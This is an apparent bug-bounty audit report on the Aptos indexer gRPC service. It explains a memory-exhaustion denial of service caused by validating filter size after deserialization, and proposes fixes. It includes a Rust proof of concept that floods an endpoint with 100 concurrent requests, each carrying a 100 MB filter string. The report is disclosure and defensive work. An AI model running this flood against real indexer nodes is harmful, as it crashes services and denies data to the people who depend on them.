# Audit Report

## Title
Memory Exhaustion via Post-Deserialization Filter Size Validation in Indexer gRPC Service

## Summary
The Aptos indexer gRPC service validates transaction filter size limits AFTER protobuf deserialization, allowing attackers to exhaust indexer node memory by sending concurrent requests containing `EventFilter` instances with extremely long `data_substring_filter` strings (up to 256 MB per request). The 10KB filter size limit is enforced too late in the processing pipeline, enabling a memory exhaustion DoS attack.

## Finding Description

The vulnerability exists in the transaction filter validation logic of the indexer gRPC data service. The attack flow is:

1. **gRPC Message Reception**: The indexer gRPC server is configured with a maximum decoding message size of 256 MB. [1](#0-0) 

2. **Protobuf Deserialization**: When a `GetTransactionsRequest` arrives, the Tonic gRPC framework deserializes the entire protobuf message into memory, including any `EventFilter` with a large `data_substring_filter` string field. [2](#0-1) 

3. **Post-Deserialization Size Check**: Only AFTER deserialization, the application code attempts to validate the filter size using `encoded_len()` against a 10KB limit. [3](#0-2) 

4. **Memory Already Allocated**: By the time the validation fails and rejects the request, the Tonic/prost decoder has already allocated memory for the large string in step 2.

5. **Concurrent Amplification**: An attacker can send multiple concurrent requests, each causing up to 256 MB of memory allocation. With sufficient concurrency (e.g., 100 concurrent requests), this results in 25.6 GB of memory allocation, causing OOM crashes.

The filter size validation implementation lacks proper pre-deserialization checks: [4](#0-3) 

The `EventFilter` struct itself has no validation on the `data_substring_filter` field length: [5](#0-4) 

The `validate_state()` implementation for `Option<String>` returns `Ok(())` without any length checks: [6](#0-5) 

The default filter size limit is only 10KB: [7](#0-6) 

However, the gRPC layer accepts messages up to 256 MB before this limit is applied: [8](#0-7) 

Additionally, there are no concurrent request limits in the indexer gRPC services to prevent amplification attacks.

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:
- **API crashes**: The indexer gRPC service can be crashed through memory exhaustion
- **Loss of availability**: Indexer nodes become unavailable, disrupting ecosystem services that depend on indexer data (wallets, explorers, analytics)

The attack does not affect blockchain consensus or validator nodes directly, but indexer infrastructure is critical for ecosystem functionality. A sustained attack could:
- Force indexer operators to restart services repeatedly
- Cause data unavailability for applications
- Require emergency mitigation measures
- Impact user experience across the ecosystem

## Likelihood Explanation

**Likelihood: HIGH**

- **Attack Complexity: LOW** - Any client can send gRPC requests to public indexer endpoints
- **Attacker Requirements: MINIMAL** - No authentication bypass needed; standard gRPC client libraries suffice
- **Detection Difficulty: MODERATE** - Requests appear valid until the size check fails; short-lived memory spikes may evade monitoring
- **Exploitability: TRIVIAL** - A simple script can generate concurrent requests with large filter strings

The attack is easily reproducible and requires no special privileges. The vulnerability exists in production deployments where indexer gRPC endpoints are publicly accessible.

## Recommendation

**Immediate Fix**: Enforce message size limits at the gRPC transport layer BEFORE deserialization, or validate filter complexity before accepting the full message.

**Option 1 - Reduce gRPC Message Size Limit** (Quick Mitigation):
```rust
// In ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs
pub(crate) const MAX_MESSAGE_SIZE: usize = 50 * (1 << 10); // Reduce to 50KB instead of 256MB
```

**Option 2 - Add Pre-Deserialization Validation** (Better Solution):
Implement a custom gRPC interceptor that validates request size before full deserialization:

```rust
// Add to ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs
use tonic::body::BoxBody;
use tonic::server::Interceptor;

#[derive(Clone)]
struct FilterSizeInterceptor {
    max_filter_bytes: usize,
}

impl Interceptor for FilterSizeInterceptor {
    fn call(&mut self, request: tonic::Request<()>) -> Result<tonic::Request<()>, tonic::Status> {
        // Validate request size before deserialization
        let content_length = request.metadata()
            .get("content-length")
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.parse::<usize>().ok())
            .unwrap_or(0);
        
        if content_length > self.max_filter_bytes {
            return Err(tonic::Status::invalid_argument(
                format!("Request size {} exceeds maximum {}", content_length, self.max_filter_bytes)
            ));
        }
        Ok(request)
    }
}
```

**Option 3 - Add Field-Level Validation** (Defense in Depth):
Add explicit length validation in the `EventFilter::validate_state()` method:

```rust
// In ecosystem/indexer-grpc/transaction-filter/src/filters/event.rs
impl Filterable<Event> for EventFilter {
    #[inline]
    fn validate_state(&self) -> Result<(), FilterError> {
        if self.data_substring_filter.is_none() && self.struct_type.is_none() {
            return Err(Error::msg("At least one of data or struct_type must be set").into());
        };
        
        // Add length validation
        if let Some(ref filter_str) = self.data_substring_filter {
            const MAX_FILTER_STRING_LENGTH: usize = 10_000;
            if filter_str.len() > MAX_FILTER_STRING_LENGTH {
                return Err(Error::msg(format!(
                    "data_substring_filter exceeds maximum length of {} bytes",
                    MAX_FILTER_STRING_LENGTH
                )).into());
            }
        }
        
        self.data_substring_filter.is_valid()?;
        self.struct_type.is_valid()?;
        Ok(())
    }
}
```

**Additional Hardening**:
- Implement concurrent request limits per client
- Add rate limiting on filter-heavy endpoints
- Monitor memory usage and implement circuit breakers

## Proof of Concept

```rust
// PoC: Memory exhaustion attack on indexer gRPC service
use aptos_protos::indexer::v1::{
    BooleanTransactionFilter, EventFilter, GetTransactionsRequest,
    boolean_transaction_filter, api_filter, ApiFilter,
};
use tokio::task::JoinSet;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let indexer_url = "http://indexer-grpc-endpoint:50051";
    
    // Create EventFilter with 100 MB data_substring_filter
    let large_string = "A".repeat(100_000_000);
    let event_filter = EventFilter {
        struct_type: None,
        data_substring_filter: Some(large_string),
    };
    
    let filter = BooleanTransactionFilter {
        filter: Some(boolean_transaction_filter::Filter::ApiFilter(ApiFilter {
            filter: Some(api_filter::Filter::EventFilter(event_filter)),
        })),
    };
    
    let request = GetTransactionsRequest {
        starting_version: Some(1),
        transactions_count: Some(100),
        batch_size: Some(10),
        transaction_filter: Some(filter),
    };
    
    // Send 100 concurrent requests to exhaust memory
    let mut tasks = JoinSet::new();
    for i in 0..100 {
        let req = request.clone();
        let url = indexer_url.to_string();
        tasks.spawn(async move {
            println!("Sending attack request {}", i);
            let mut client = aptos_protos::indexer::v1::raw_data_client::RawDataClient::connect(url)
                .await
                .unwrap();
            let _response = client.get_transactions(req).await;
            // Request will be rejected after deserialization, but memory already allocated
        });
    }
    
    // Wait for all requests - server should experience memory pressure/crash
    while let Some(_) = tasks.join_next().await {}
    
    println!("Attack completed - indexer should experience memory exhaustion");
    Ok(())
}
```

**Expected Behavior**: The indexer node experiences severe memory pressure as 100 concurrent requests each allocate ~100 MB during protobuf deserialization (total ~10 GB), even though all requests are eventually rejected by the filter size validation.

## Notes

This vulnerability highlights a common anti-pattern in gRPC services: enforcing size/complexity limits after deserialization rather than before. While the 10KB filter size limit exists as a security control, its placement in the processing pipeline renders it ineffective against memory exhaustion attacks. The issue is exacerbated by the 256 MB gRPC message size limit, which creates a 25,600x amplification factor between the intended limit (10KB) and the actual memory allocation capability (256 MB per request).

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L240-241)
```rust
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L62-67)
```rust
pub struct EventFilter {
    #[prost(message, optional, tag="1")]
    pub struct_type: ::core::option::Option<MoveStructTagFilter>,
    #[prost(string, optional, tag="2")]
    pub data_substring_filter: ::core::option::Option<::prost::alloc::string::String>,
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L98-106)
```rust
        if let Some(max_filter_size) = max_filter_size {
            ensure!(
                proto_filter.encoded_len() <= max_filter_size,
                format!(
                    "Filter is too complicated. Max size: {} bytes, Actual size: {} bytes",
                    max_filter_size,
                    proto_filter.encoded_len()
                )
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L98-112)
```rust
                let filter = if let Some(proto_filter) = request.transaction_filter {
                    match filter_utils::parse_transaction_filter(
                        proto_filter,
                        self.max_transaction_filter_size_bytes,
                    ) {
                        Ok(filter) => Some(filter),
                        Err(err) => {
                            info!("Client error: {err:?}.");
                            let _ = response_sender.blocking_send(Err(err));
                            COUNTER
                                .with_label_values(&["live_data_service_invalid_filter"])
                                .inc();
                            continue;
                        },
                    }
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/filters/event.rs (L32-42)
```rust
pub struct EventFilter {
    #[serde(skip_serializing_if = "Option::is_none")]
    #[builder(setter(into, strip_option), default)]
    pub data_substring_filter: Option<String>,
    // Only for events that have a struct as their generic
    #[serde(skip_serializing_if = "Option::is_none")]
    pub struct_type: Option<MoveStructTagFilter>,
    #[serde(skip)]
    #[derivative(PartialEq = "ignore")]
    data_substring_finder: OnceCell<Finder<'static>>,
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/traits.rs (L108-121)
```rust
impl Filterable<String> for Option<String> {
    #[inline]
    fn validate_state(&self) -> Result<(), FilterError> {
        Ok(())
    }

    #[inline]
    fn matches(&self, item: &String) -> bool {
        match self {
            Some(filter) => filter == item,
            None => true,
        }
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L21-21)
```rust
pub const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;
```
